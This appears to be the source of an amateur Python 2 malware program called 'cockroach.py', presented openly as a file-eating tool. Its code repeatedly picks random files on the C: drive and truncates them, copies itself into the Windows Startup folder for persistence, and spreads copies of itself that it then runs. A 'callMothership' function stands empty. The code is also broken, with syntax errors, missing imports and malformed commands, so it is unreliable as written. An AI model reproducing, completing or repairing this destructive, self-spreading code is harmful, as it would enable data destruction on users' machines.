#!/c/Python27/python.exe
#cockroach.py - nom nom nom files sure are tasty
#0xicl33n
from os import system
import random
import time
from random import randint
from time import sleep
from binascii import unhexlify
import dircache
import shutil
from threading import Thread
import threading
import win32file
import subprocess
sleep = time.sleep()
sysc = os.system
ourUser = os.getenv('username')
mainPid = os.getpid()
ourFolder = "C:"
ourSelf = os.getcwd() + "roach.exe"
possibleDrives = ['B','C','D','E','F','G','H','I','J','K','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
random.seed()
startup = 0


def checkDrive(drive):
    	drive = random.choice(possibleDrives)
		if win32file.GetDriveType("%s:\\") == win32file.DRIVE_REMOTE %(drive):
    			#do something
    	else:
    		pass


def getRandomfile(): # returns a random file 
	dircache.reset()
	thisFile = ourFolder  + "\\" + random.choice(dircache.listdir(ourFolder))
	return thisFile

def munch(file): # om nom nom
	chewThis = random.randint(1,1337) * 10
	print "[@]DEBUG: IMMA MUNCH THIS:",file 
	print "[@]DEBUG: IMMA EAT",chewThis,'BYTES'
	with open(file, 'w+') as fdest:
        	fdest.seek(chewThis, os.SEEK_END)
        	fdest.truncate(chewThis)
        	#print "[@]DEBUG: NOM NOM TASTY FILES"

def getTime(): # will munch at this interval
	thisTime = randint(60,600) # 1 minute through 10 minute(s)
	return thisTime

def callMothership():

def spread():
    	thisFolder = getRandomfile()
    	subprocess.Popen(["robocopy" + ourself + thisFolder,"& start" thisFolder+"\\"+ourSelf], stdout=subprocess.PIPE)
		
def runOnce():
    	subprocess.Popen(["robocopy" + ourself + "C:\\Users\\All Users\\Microsoft\Windows\\Start Menu\\Programs\\Startup"], stdout=subprocess.PIPE)

    	
def run(): # the guts before the guts
	if random.randint(1,100) < 23: # chance to spread every time we execute the main function
    		spread()
	try:
		datFile = getRandomfile()
		if "ini" in datFile:
			datFile = getRandomfile()
			munch(datFile)
			main()
		else:
			munch(datFile)
			main()
	except IOError, e: # handle that stupid ini error, yes!
		#print e
		pass
		main()

def main(): # the guts
	while 1:
    	if startup < 1:
    			runOnce()
				startup +=1
		#sleep(5)
		print "[@]DEBUG: HAY I AM",mainPid
		print "[@]DEBUG: IMMA SLEEP FOR",getTime(), 'SECONDS'
		thisTime = getTime()
		run()
main()